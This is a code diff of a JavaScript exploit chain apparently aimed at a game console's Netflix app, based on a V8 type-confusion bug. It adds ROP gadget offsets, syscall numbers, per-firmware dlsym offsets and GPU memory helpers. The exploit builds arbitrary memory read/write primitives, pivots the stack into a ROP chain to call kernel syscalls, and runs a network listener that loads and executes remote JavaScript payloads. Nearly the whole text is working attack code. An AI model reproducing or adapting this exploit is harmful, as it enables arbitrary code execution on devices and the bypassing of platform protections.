@@ -2,6 +2,168 @@
 // based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
 // thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html
 
+// #region misc
+
+let SYSCALL = {
+    read: 0x3n,
+    write: 0x4n,
+    open: 0x5n,
+    close: 0x6n,
+    setuid: 0x17n,
+    getuid: 0x18n,
+    accept: 0x1en,
+    pipe: 0x2an,
+    mprotect: 0x4an,
+
+    socket: 0x61n,
+    connect: 0x62n,
+    bind: 0x68n,
+    setsockopt: 0x69n,
+    listen: 0x6an,
+    getsockopt: 0x76n,
+    netgetiflist: 0x7dn,
+    socketpair: 0x87n,
+
+    sysctl: 0xcan,
+    nanosleep: 0xf0n,
+    sigaction: 0x1a0n,
+    dlsym: 0x24fn,
+    dynlib_load_prx: 0x252n,
+    dynlib_unload_prx: 0x253n,
+    randomized_path: 0x25an,
+    is_in_sandbox: 0x249n,
+    mmap: 0x1ddn,
+    getpid: 0x14n,
+    jitshm_create: 0x215n,
+    jitshm_alias: 0x216n,
+    unlink: 0xan,
+    chmod: 0xfn,
+    recvfrom: 0x1dn,
+    getsockname: 0x20n,
+    rename: 0x80n,
+    sendto: 0x85n,
+    mkdir: 0x88n,
+    rmdir: 0x89n,
+    stat: 0xbcn,
+    getdents: 0x110n,
+    lseek: 0x1den,
+    dup2: 0x5an,
+    fcntl: 0x5cn,
+    select: 0x5dn,
+    fstat: 0xbdn,
+    umtx_op: 0x1c6n,
+    cpuset_getaffinity: 0x1e7n,
+    cpuset_setaffinity: 0x1e8n,
+    rtprio_thread: 0x1d2n,
+    ftruncate: 0x1e0n,
+    sched_yield: 0x14bn,
+    munmap: 0x49n,
+    fsync: 0x5fn,
+    ioctl: 0x36n,
+
+    thr_new: 0x1c7n,
+    thr_exit: 0x1afn,
+    thr_self: 0x1b0n,
+    thr_suspend_ucontext: 0x278n,
+    thr_resume_ucontext: 0x279n,
+
+    evf_create: 0x21an,
+    evf_delete: 0x21bn,
+    evf_set: 0x220n,
+    evf_clear: 0x221n,
+
+    aio_multi_delete: 0x296n,
+    aio_multi_wait: 0x297n,
+    aio_multi_poll: 0x298n,
+    aio_multi_cancel: 0x29an,
+    aio_submit_cmd: 0x29dn
+};
+
+let DLSYM_OFFSETS = {
+    "4.03": 0x317D0n,
+    "4.50": 0x317D0n,
+    "4.51": 0x317D0n,
+    "5.00": 0x32160n,
+    "5.02": 0x32160n,
+    "5.10": 0x32160n,
+    "5.50": 0x32230n,
+    "6.00": 0x330A0n,
+    "6.02": 0x330A0n,
+    "6.50": 0x33110n,
+    "7.00": 0x33E90n,
+    "7.01": 0x33E90n,
+    "7.20": 0x33ED0n,
+    "7.40": 0x33ED0n,
+    "7.60": 0x33ED0n,
+    "7.61": 0x33ED0n,
+    "8.00": 0x342E0n,
+    "8.20": 0x342E0n,
+    "8.40": 0x342E0n,
+    "8.60": 0x342E0n,
+    "9.00": 0x350E0n,
+    "9.20": 0x350E0n,
+    "9.40": 0x350E0n,
+    "9.60": 0x350E0n,
+    "10.00": 0x349C0n,
+    "10.01": 0x349C0n
+};
+
+let eboot_base = 0n;
+
+// FreeBSD constants (https://github.com/PS5Dev/PS5SDK)
+
+const O_RDONLY =	0x0000n;	/* open for reading only */
+const O_WRONLY =	0x0001n;	/* open for writing only */
+const O_RDWR =		0x0002n;	/* open for reading and writing */
+const O_ACCMODE =	0x0003n;	/* mask for above modes */
+
+const O_NONBLOCK =	0x0004n;	/* no delay */
+const O_APPEND =	0x0008n;	/* set append mode */
+const O_CREAT =     0x0200n;    /* create if nonexistent */
+const O_TRUNC =     0x0400n;    /* truncate to zero length */
+
+const SO_REUSEADDR = 4n;        /* allow local address reuse */
+const SO_LINGER =    0x80n;     /* linger on close if data present */
+
+const SOL_SOCKET =   0xffffn;   /* options for socket level */
+const AF_UNIX =      1n;        /* standardized name for AF_LOCAL */
+const AF_INET =      2n;        /* internetwork: UDP, TCP, etc. */
+const AF_INET6 =     28n;       /* IPv6 */
+const SOCK_STREAM =  1n;        /* stream socket */
+const SOCK_DGRAM =   2n;        /* datagram socket */
+
+const IPPROTO_TCP =  6n;        /* tcp */
+const IPPROTO_UDP =  17n;       /* user datagram protocol */
+const IPPROTO_IPV6 = 41n;       /* IP6 header */
+const IPV6_PKTINFO = 46n;       /* int; send hop limit */
+const INADDR_ANY =   0n;
+
+const TCP_INFO =         0x20n; /* retrieve tcp_info structure */
+const size_tcp_info =    0xecn  /* struct tcp_info */
+const TCPS_ESTABLISHED = 4n;
+
+const IPV6_2292PKTOPTIONS = 25n;
+const IPV6_NEXTHOP =        48n;
+const IPV6_RTHDR =          51n;
+const IPV6_TCLASS =         61n;
+
+const PROT_NONE =   0x0n;       /* no permissions */
+const PROT_READ =   0x1n;       /* pages can be read */
+const PROT_WRITE =  0x2n;       /* pages can be written */
+const PROT_EXEC =   0x4n;       /* pages can be executed */
+
+const MAP_SHARED =      0x1n;   /* share changes */
+const MAP_PRIVATE =     0x2n;   /* changes are private */
+const MAP_FIXED =       0x10n;  /* map addr must be exactly as requested */
+const MAP_ANONYMOUS =   0x1000n;
+const MAP_NO_COALESCE = 0x400000n;
+
+const GPU_READ =    0x10n;
+const GPU_WRITE =   0x20n;
+const GPU_RW =      0x30n;
+
+// #endregion
+
 // #region WebSocket
 const ws = {
     socket: null,
@@ -214,53 +376,67 @@ function hex(value)
   return "0x" + value.toString(16).padStart(8, "0");
 }
 
+gadgets_eu_6 = {
+    /** Gadgets for Function Arguments **/
+    pop_rax: 0x6c233n,
+    pop_rdi: 0x1a729bn,
+    pop_rsi: 0x14d8n,
+    pop_rdx: 0x3ec42n,
+    pop_rcx: 0x2485n,
+    pop_r8:  0x6c232n,
+    pop_r9:  0x66511bn,
+
+    /** Other Gadgets **/
+    ret:                   0x42n,
+    pop_rbp:               0x79n,
+    pop_rbx:               0x2e1ebn,
+    pop_rsp:               0x1df1e1n,
+    pop_rsp_pop_rbp:       0x17ecb4en,
+    mov_qword_ptr_rdi_rax: 0x1dcba9n,
+    mov_qword_ptr_rdi_rdx: 0x36db4en,
+};
+
+gadgets_us_5 = {
+    /** Gadgets for Function Arguments **/
+    pop_rax: 0x6c233n,
+    pop_rdi: 0x24f3c2n, // Changed
+    pop_rsi: 0x14d8n,
+    pop_rdx: 0x3ec42n,
+    pop_rcx: 0x2485n,
+    pop_r8:  0x6c232n,
+    pop_r9:  0x66511bn,
+
+    /** Other Gadgets **/
+    ret:                   0x42n,
+    pop_rbp:               0x79n,
+    pop_rbx:               0x2e1ebn,
+    pop_rsp:               0x13c719n, // Changed
+    pop_rsp_pop_rbp:       0x17ecb4en,
+    mov_qword_ptr_rdi_rax: 0x1dcba9n,
+    mov_qword_ptr_rdi_rdx: 0x36db4en,
+};
+
+gadgets_list = {
+    'Gemini-U6-2': gadgets_eu_6,
+    'Gemini-U5-18': gadgets_us_5,
+};
+
 class gadgets {
     constructor() {
-        try {
-            switch (nrdp.version.nova.app_version) {
-                case 'Gemini-U6-2':         // EU 6.000
-                    /** Gadgets for Function Arguments **/
-                    this.pop_rax = 0x6c233n;
-                    this.pop_rdi = 0x1a729bn;
-                    this.pop_rsi = 0x14d8n;
-                    this.pop_rdx = 0x3ec42n;
-                    this.pop_rcx = 0x2485n;
-                    this.pop_r8 = 0x6c232n;
-                    this.pop_r9 = 0x66511bn;
-                    
-                    /** Other Gadgets **/
-                    this.pop_rbp = 0x79n;
-                    this.pop_rbx = 0x2e1ebn;
-                    this.pop_rsp = 0x1df1e1n;
-                    this.pop_rsp_pop_rbp = 0x17ecb4en;
-                    this.mov_qword_ptr_rdi_rax = 0x1dcba9n;
-                    break;
-                case 'Gemini-U5-18':        // US 5.000
-                    /** Gadgets for Function Arguments **/
-                    this.pop_rax = 0x6c233n;
-                    this.pop_rdi = 0x24f3c2n; // Changed
-                    this.pop_rsi = 0x14d8n;
-                    this.pop_rdx = 0x3ec42n;
-                    this.pop_rcx = 0x2485n;
-                    this.pop_r8 = 0x6c232n;
-                    this.pop_r9 = 0x66511bn;
-                    
-                    /** Other Gadgets **/
-                    this.pop_rbp = 0x79n;
-                    this.pop_rbx = 0x2e1ebn;
-                    this.pop_rsp = 0x13c719n; // Changed
-                    this.pop_rsp_pop_rbp = 0x17ecb4en;
-                    this.mov_qword_ptr_rdi_rax = 0x1dcba9n;
-                    break;
-                default:
-                    throw new Error("App version not supported");
-            }
-        }
-        catch (e) {
-            throw new Error("App version not supported : " + e);
+        switch (nrdp.version.nova.app_version) {
+            case 'Gemini-U6-2':         // EU 6.000
+                break;
+            case 'Gemini-U5-18':        // US 5.000
+                break;
+            default:
+                throw new Error("App version not supported");
         }
     }
-}
+    get(gadget) {
+        let list = gadgets_list[nrdp.version.nova.app_version];
+        return eboot_base + list[gadget];
+    }
+};
 
 function stringToBytes (str) {
   const len = str.length;
@@ -382,7 +558,12 @@ function main () {
         
         let add_string = addrof_unstable(string) + 12n;
         logger.log("Address of 'string' text: " + hex(add_string));
+        let string_value = read32_unstable(add_string);
         logger.log("Original value of 'string' (should be 0x54584554): 0x" + read32_unstable(add_string).toString(16) ) ;
+
+        if (BigInt(string_value) !== 0x54584554n) {
+            throw new Error("Could not create unstable primitives. Try again.");
+        }
 
         write32_unstable(add_string, 0x41414141n);
         logger.log("Overwritten value of 'string' (should be AAAA): " + string );
@@ -394,7 +575,7 @@ function main () {
         logger.log("Base heap address: " + hex(base_heap_add));
         logger.log("Top 32bits heap address: " + hex(top32b_heap));
         let leak_eboot_add = read64_unstable(0x28n); // Read at base heap + 0x28 (upper 32b are completed by v8)
-        let eboot_base = leak_eboot_add - 0x8966C8n; // This is not realiable as the addess changes
+        eboot_base = leak_eboot_add - 0x8966C8n;    // This is not realiable as the addess changes
         // Previously used offsets: 0x88C76En , 0x8966C8n
         // Seems to be a ptr that the app updates while running
         // If nothing is changed in the code before this point, it should not change
@@ -782,15 +963,15 @@ function main () {
         let value_delete = rop_smash(1); // Generate Bytecode
 
         add_rop_smash = addrof(rop_smash);
-        logger.log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
+        //logger.log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
         add_rop_smash_sharedfunctioninfo = read32(add_rop_smash + 0x0Cn) -1n;
         add_rop_smash_code = read32(add_rop_smash_sharedfunctioninfo + 0x04n) -1n;
         add_rop_smash_code_store = add_rop_smash_code + 0x22n;        
 
-        logger.log("Address of fake_frame: 0x" + hex(base_heap_add + fake_frame) );
-        logger.log("Address of fake_bytecode: " + hex(base_heap_add + fake_bytecode) );
-        logger.log("Address of fake_rop_return: " + hex(base_heap_add + fake_rop_return) );
-        
+        //logger.log("Address of fake_frame: 0x" + hex(base_heap_add + fake_frame) );
+        //logger.log("Address of fake_bytecode: " + hex(base_heap_add + fake_bytecode) );
+        //logger.log("Address of fake_rop_return: " + hex(base_heap_add + fake_rop_return) );
+
         write8(fake_bytecode + 0x00n, 0xABn);
         write8(fake_bytecode + 0x17n, 0x00n); // Here is the value of RBX , force 0
 
@@ -816,7 +997,7 @@ function main () {
         write64(fake_frame  - 0x28n, 0x00n);                    // Force the value of R9 = 0                                                                          
         write64(fake_frame  - 0x18n, 0xff00000000000000n); // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
                                                                           
-        write64(fake_frame + 0x08n, eboot_base + g.pop_rsp); // pop rsp ; ret --> this change the stack pointer to your stack
+        write64(fake_frame + 0x08n, g.get('pop_rsp')); // pop rsp ; ret --> this change the stack pointer to your stack
         write64(fake_frame + 0x10n, rop_address);
 
         // This function is calling a given function address and takes all arguments
@@ -831,35 +1012,35 @@ function main () {
             let i = 0;
 
             // Syscall Number (Syscall Wrapper)
-            fake_rop[i++] = eboot_base + g.pop_rax;
+            fake_rop[i++] = g.get('pop_rax');
             fake_rop[i++] = rax;
 
             // Arguments
-            fake_rop[i++] = eboot_base + g.pop_rdi;
+            fake_rop[i++] = g.get('pop_rdi');
             fake_rop[i++] = arg1;
-            fake_rop[i++] = eboot_base + g.pop_rsi;
+            fake_rop[i++] = g.get('pop_rsi');
             fake_rop[i++] = arg2;
-            fake_rop[i++] = eboot_base + g.pop_rdx;
+            fake_rop[i++] = g.get('pop_rdx');
             fake_rop[i++] = arg3;
-            fake_rop[i++] = eboot_base + g.pop_rcx;
+            fake_rop[i++] = g.get('pop_rcx');
             fake_rop[i++] = arg4;
-            fake_rop[i++] = eboot_base + g.pop_r8;
+            fake_rop[i++] = g.get('pop_r8');
             fake_rop[i++] = arg5;
-            fake_rop[i++] = eboot_base + g.pop_r9;
+            fake_rop[i++] = g.get('pop_r9');
             fake_rop[i++] = arg6;
 
             // Call Syscall Wrapper / Function
             fake_rop[i++] = address;
 
             // Store return value to fake_rop_return
-            fake_rop[i++] = eboot_base + g.pop_rdi;
+            fake_rop[i++] = g.get('pop_rdi');
             fake_rop[i++] = base_heap_add + fake_rop_return;
-            fake_rop[i++] = eboot_base + g.mov_qword_ptr_rdi_rax;
+            fake_rop[i++] = g.get('mov_qword_ptr_rdi_rax');
 
             // Return to JS
-            fake_rop[i++] = eboot_base + g.pop_rax;
+            fake_rop[i++] = g.get('pop_rax');
             fake_rop[i++] = 0x2000n;                   // Fake value in RAX to make JS happy
-            fake_rop[i++] = eboot_base + g.pop_rsp_pop_rbp;
+            fake_rop[i++] = g.get('pop_rsp_pop_rbp');
             fake_rop[i++] = real_rbp;
             
             write64(add_rop_smash_code_store, 0xab00260325n);
@@ -884,6 +1065,25 @@ function main () {
         logger.log("syscall_wrapper : " + hex(syscall_wrapper));
         const sceKernelGetModuleInfoFromAddr = read64_uncompressed(libc_base + 0x10fa88n);
 
+        // Used for gpu rw
+        const sceKernelAllocateMainDirectMemory = read64_uncompressed(eboot_base + 0x241f6a8n);
+        const sceKernelMapDirectMemory = read64_uncompressed(eboot_base + 0x241f680n);
+
+        const libkernel__error = read64_uncompressed(eboot_base + 0x241f3c8n);
+        const libc_strerror = read64_uncompressed(eboot_base + 0x241f3d0n);
+
+        /* Useful for getting a description after a syscall failure */
+        function get_error_string () {
+            let errno_func = call(libkernel__error);
+            let errno = read64_uncompressed(errno_func);
+            let strerror_add = call(libc_strerror, errno);
+            let return_str = errno + " " + read_cstring(strerror_add);
+            return return_str;
+        }
+
+        const setjmp_addr = read64_uncompressed(eboot_base + 0x241f5f0n);
+        const longjmp_addr = read64_uncompressed(eboot_base + 0x241f5f8n);
+
         const mod_info = malloc(0x300);
         const SEGMENTS_OFFSET = 0x160n;
         
@@ -905,44 +1105,6 @@ function main () {
             call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
             return read64(fake_rop_return);
         }
-        
-        let SYSCALL = {
-            read: 0x3n,
-            write: 0x4n,
-            open: 0x5n,
-            close: 0x6n,
-            getuid: 0x18n,
-            getsockname: 0x20n,
-            accept: 0x1en,
-            socket: 0x61n,
-            connect: 0x62n,
-            bind: 0x68n,
-            setsockopt: 0x69n,
-            listen: 0x6an,
-            getsockopt: 0x76n,
-            sysctl: 0xcan,
-            netgetiflist: 0x7dn,
-        };
-
-        const O_RDONLY = 0n;
-        const O_WRONLY = 1n;
-        const O_RDWR = 2n;
-        const O_CREAT = 0x100n;
-        const O_TRUNC = 0x1000n;
-        const O_APPEND = 0x2000n;
-        const O_NONBLOCK = 0x4000n;
-
-        const AF_INET = 2n;
-        const AF_INET6 = 28n;
-        const SOCK_STREAM = 1n;
-        const SOCK_DGRAM = 2n;
-        const IPPROTO_UDP = 17n;
-        const IPPROTO_IPV6 = 41n;
-        const IPV6_PKTINFO = 46n;
-        const INADDR_ANY = 0n;
-
-        const SOL_SOCKET = 0xffffn;
-        const SO_REUSEADDR = 4n;
 
         function write_string(addr, str) {            
             let bytes = stringToBytes(str);
@@ -1000,31 +1162,31 @@ function main () {
 
         const MAXSIZE = 500 * 1024;
 
-        const sockaddr_in = malloc(16);
-        const addrlen = malloc(8);
-        const enable = malloc(4);
-        const len_ptr = malloc(8);
-        const payload_buf = malloc(MAXSIZE);
-        let sock_fd = null;
-        let port = 0;
+        const main_sockaddr_in = malloc(16);
+        const main_addrlen = malloc(8);
+        const main_enable = malloc(4);
+        const main_len_ptr = malloc(8);
+        const main_payload_buf = malloc(MAXSIZE);
+        let main_sock_fd = null;
+        let main_port = 0;
 
         function create_socket() {
             // Clear sockaddr
-            for (let i = 0; i < 16; i++) write8_uncompressed(sockaddr_in + BigInt(i), 0);
+            for (let i = 0; i < 16; i++) write8_uncompressed(main_sockaddr_in + BigInt(i), 0);
 
             const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
             if (sock_fd === 0xffffffffffffffffn) {
                 throw new Error("Socket creation failed: " + toHex(sock_fd));
             }
 
-            write32_uncompressed(enable, 1);
-            syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);
+            write32_uncompressed(main_enable, 1);
+            syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, main_enable, 4n);
 
-            write8_uncompressed(sockaddr_in + 1n, AF_INET);
-            write16_uncompressed(sockaddr_in + 2n, 0);        // port 0
-            write32_uncompressed(sockaddr_in + 4n, 0);        // INADDR_ANY
+            write8_uncompressed(main_sockaddr_in + 1n, AF_INET);
+            write16_uncompressed(main_sockaddr_in + 2n, 0);        // port 0
+            write32_uncompressed(main_sockaddr_in + 4n, 0);        // INADDR_ANY
 
-            const bind_ret = syscall(SYSCALL.bind, sock_fd, sockaddr_in, 16n);
+            const bind_ret = syscall(SYSCALL.bind, sock_fd, main_sockaddr_in, 16n);
             if (bind_ret === 0xffffffffffffffffn) {
                 syscall(SYSCALL.close, sock_fd);
                 throw new Error("Bind failed: " + toHex(bind_ret));
@@ -1039,11 +1201,29 @@ function main () {
             return sock_fd;
         }
 
-        function get_port(sock_fd) {
-            write32_uncompressed(len_ptr, 16);
-            syscall(SYSCALL.getsockname, sock_fd, sockaddr_in, len_ptr);
+        function recreate_socket() {
+            const sock_fd = create_socket();
+            const port = get_port(sock_fd);
 
-            const port_be = read16_uncompressed(sockaddr_in + 2n);
+            const current_ip = get_current_ip();
+            if (current_ip === null) {
+                send_notification("No network available!\nAborting...");
+                throw new Error("No network available!\nAborting...");
+            }
+
+            const network_str = current_ip + ":" + port;
+            logger.log("Socket recreated on " + network_str);
+            logger.flush();
+            send_notification("Remote JS Loader\nListening on " + network_str);
+
+            return { sock_fd, port, network_str };
+        }
+
+        function get_port(sock_fd) {
+            write32_uncompressed(main_len_ptr, 16);
+            syscall(SYSCALL.getsockname, sock_fd, main_sockaddr_in, main_len_ptr);
+
+            const port_be = read16_uncompressed(main_sockaddr_in + 2n);
             return Number(((port_be & 0xFFn) << 8n) | ((port_be >> 8n) & 0xFFn));
         }
 
@@ -1093,8 +1273,9 @@ function main () {
             return null;
         }
 
-        sock_fd = create_socket();
-        port = get_port(sock_fd);
+
+        main_sock_fd = create_socket();
+        main_port = get_port(main_sock_fd);
         const current_ip = get_current_ip();
 
         if (current_ip === null) {
@@ -1102,10 +1283,11 @@ function main () {
             throw new Error("No network available!\nAborting...");
         }
 
-        let network_str = current_ip + ":" + port;
+        let network_str = current_ip + ":" + main_port;
         logger.log("Remote JS Loader listening on " + network_str);
         send_notification("Remote JS Loader\nListening on " + network_str);
         logger.flush(); // Force display before entering async loop
+
 
         // Async socket accept loop - allows logger to stay responsive
         (async () => {
@@ -1117,16 +1299,16 @@ function main () {
                     // Yield to event loop before blocking accept() call
                     await new Promise(resolve => nrdp.setTimeout(resolve, 10));
 
-                    write32_uncompressed(addrlen, 16);
-                    const client_fd = syscall(SYSCALL.accept, sock_fd, sockaddr_in, addrlen);
+                    write32_uncompressed(main_addrlen, 16);
+                    const client_fd = syscall(SYSCALL.accept, main_sock_fd, main_sockaddr_in, main_addrlen);
 
                 if (client_fd === 0xffffffffffffffffn) {
                     logger.log("accept() failed: " + toHex(client_fd) + " - recreating socket");
                     syscall(SYSCALL.close, sock_fd);
 
                     const recreated = recreate_socket();
-                    sock_fd = recreated.sock_fd;
-                    port = recreated.port;
+                    main_sock_fd = recreated.sock_fd;
+                    main_port = recreated.port;
                     network_str = recreated.network_str;
                     continue;
                 }
@@ -1141,7 +1323,7 @@ function main () {
                     const bytes_read = syscall(
                         SYSCALL.read,
                         client_fd,
-                        payload_buf + BigInt(total_read),
+                        main_payload_buf + BigInt(total_read),
                         BigInt(MAXSIZE - total_read)
                     );
 
@@ -1168,7 +1350,7 @@ function main () {
 
                 const bytes = new Uint8Array(total_read);
                 for (let i = 0; i < total_read; i++) {
-                    let read = read8_uncompressed(payload_buf + BigInt(i));
+                    let read = read8_uncompressed(main_payload_buf + BigInt(i));
                     bytes[i] = Number(read);
                 }
 
@@ -1199,5 +1381,5 @@ function main () {
     }
 }
 
-//ws.init("10.0.0.2", 1337, main);// uncomment this to enable WebSocket logging
+//ws.init("10.0.0.2", 1337, null);// uncomment this to enable WebSocket logging
 main();
